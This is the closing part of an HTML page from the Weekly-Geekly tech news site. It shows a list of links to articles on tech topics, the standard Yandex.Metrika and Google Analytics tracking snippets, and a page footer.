<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../14127/index.html">Opera 9.5 for developers</a></li>
<li><a href="../141270/index.html">Closures on loop variables in C # 5</a></li>
<li><a href="../141271/index.html">Fabric - a pair of application recipes</a></li>
<li><a href="../141272/index.html">IBM celebrates OS / 2‚Äôs 25th anniversary</a></li>
<li><a href="../141274/index.html">James Cameron edited "Titanic 3D" after an astrophysicist pointed out the error</a></li>
<li><a href="../141276/index.html">Codecademy added courses on HTML and CSS</a></li>
<li><a href="../141277/index.html">Yegor Khomyakov continues hacking</a></li>
<li><a href="../14128/index.html">Yandex is especially good ...</a></li>
<li><a href="../141280/index.html">Service to find similar people</a></li>
<li><a href="../141281/index.html">IT world is a crypt</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>